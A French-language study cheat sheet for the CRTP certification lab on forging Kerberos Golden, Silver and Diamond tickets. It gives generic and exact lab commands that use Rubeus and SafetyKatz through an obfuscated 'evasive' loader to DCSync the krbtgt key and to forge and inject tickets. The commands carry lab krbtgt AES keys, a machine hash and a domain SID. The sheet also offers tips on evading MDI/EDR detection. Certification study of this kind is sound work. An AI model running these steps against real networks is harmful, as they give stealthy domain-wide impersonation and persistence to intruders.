# Tickets Kerberos — Golden / Silver / Diamond · LO8-10

> [!summary] Forger des tickets Kerberos pour usurper une identité sans repasser par le KDC. Golden = TGT (tout le domaine), Silver = TGS (un service), Diamond = TGT légitime re-signé (furtif). Le lab charge Rubeus via `Loader.exe` (build obfusqué `evasive-*`). Cadre lab/cert : voir [[CRTP - Index]].

## Golden Ticket · LO8

**But :** TGT signé avec la clé `krbtgt` → usurper n'importe qui (DA/EA), hors-ligne, tant que `krbtgt` n'est pas reset **2×**. · **Pré :** clé AES256 de `krbtgt` (via DCSync) + SID domaine + DA sur le VM.

```powershell
Rubeus.exe dcsync /user:<DOMAIN>\krbtgt                                              # 1. clé krbtgt
Rubeus.exe golden /aes256:<krbtgt_aes256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd   # 2. cmd OPSEC
Rubeus.exe golden <champs imprimés par /printcmd> /ptt                               # 3. forger + injecter
```

⚠️ Utiliser `/aes256`, **pas** `/rc4` (Golden RC4 = downgrade détecté). `/ldap` remplit le PAC pour un ticket cohérent. Reset `krbtgt` ×2 = ticket mort.

> [!tip]- Dans quel cas l'utiliser
> Après avoir obtenu DA : pour **persister** (re-devenir DA à volonté, hors-ligne) ou survivre à un reset du mot de passe d'un compte admin. En env. surveillé (MDI) préférer Diamond.

> [!example]- Commandes exactes du lab — LO8
> ```text
> # Extraction secrets DC (DCSync via SafetyKatz)
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
>
> # Générer la commande golden OPSEC (3 requêtes LDAP au DC)
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden ^
>   /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 ^
>   /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
>
> # Forger + injecter (reprendre la commande imprimée, ajouter -path ... -args et /ptt)
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden ^
>   /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 ^
>   /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local ^
>   /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" ^
>   /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 ^
>   /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
>
> winrs -r:dcorp-dc cmd     # vérif accès DC
> ```

## Silver Ticket · LO9

**But :** TGS pour **un service précis** forgé avec le hash du **compte de service** (souvent le compte machine). Aucun contact KDC → plus furtif que Golden, périmètre = 1 service/1 hôte. · **Pré :** hash (RC4/AES256) du compte cible (ex. `dcorp-dc$`) + SID.

```powershell
Rubeus.exe silver /service:http/<DC_FQDN> /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN> /ptt
# WMI = 2 tickets : HOST + RPCSS
Rubeus.exe silver /service:host/<DC_FQDN>  /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN> /ptt
Rubeus.exe silver /service:rpcss/<DC_FQDN> /rc4:<machine_hash> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN> /ptt
```

⚠️ Hash du **service**, pas `krbtgt`. WMI ⇒ **HOST + RPCSS** sinon échec. Le ticket porte le **FQDN** → cibler `winrs -r:<DC_FQDN>`.

> [!tip]- Dans quel cas l'utiliser
> Quand tu as le hash d'un compte machine/service mais **pas** `krbtgt` : accès ciblé et discret à un service (WinRM/WMI/CIFS) sans générer de trafic vers le KDC.

> [!example]- Commandes exactes du lab — LO9
> ```text
> # HTTP (rc4 = hash machine dcorp-dc$)
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver ^
>   /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 ^
>   /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator ^
>   /domain:dollarcorp.moneycorp.local /ptt
> winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
>
> # WMI : HOST puis RPCSS, puis :
> ... evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:... /ptt
> ... evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:... /ptt
> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
> ```

## Diamond Ticket · LO10

**But :** demander un **vrai TGT** puis re-signer son PAC avec la clé `krbtgt`. Baseline légitime → plus furtif que Golden. · **Pré :** clé `krbtgt` + pouvoir demander un TGT (`/tgtdeleg`).

```powershell
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /tgtdeleg /enctype:aes /ticketuser:administrator /ticketuserid:500 /groups:512 /domain:<DOMAIN> /dc:<DC_FQDN> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

⚠️ Nécessite la clé `krbtgt` comme Golden — le gain n'est **pas** moins de privilège mais la **furtivité** (PAC greffé sur un TGT authentique). `/enctype:aes` obligatoire.

> [!tip]- Dans quel cas l'utiliser
> Même prérequis que Golden, mais à préférer quand un EDR/MDI surveille les anomalies de tickets : le TGT de base est réel, seul le PAC est modifié.

> [!example]- Commande exacte du lab — LO10
> ```text
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond ^
>   /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 ^
>   /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local ^
>   /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 ^
>   /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
> ```

> [!note] Comparatif — Golden signé par clé `krbtgt` (tout le domaine, aucun KDC, furtivité AES>RC4) · Silver signé par hash du service (1 service, aucun KDC, bonne furtivité) · Diamond signé par clé `krbtgt` sur un TGT réel (tout le domaine, contacte le KDC, **meilleure** furtivité).

**Voir aussi :** [[Cheatsheet - Kerberoasting]] · [[Cheatsheet - AS-REP Roasting]] · [[Cheatsheet - Persistence]] (DCSync, DSRM) · [[Synthèse - Kerberos]] · [[Cheatsheet - Toutes les commandes]]
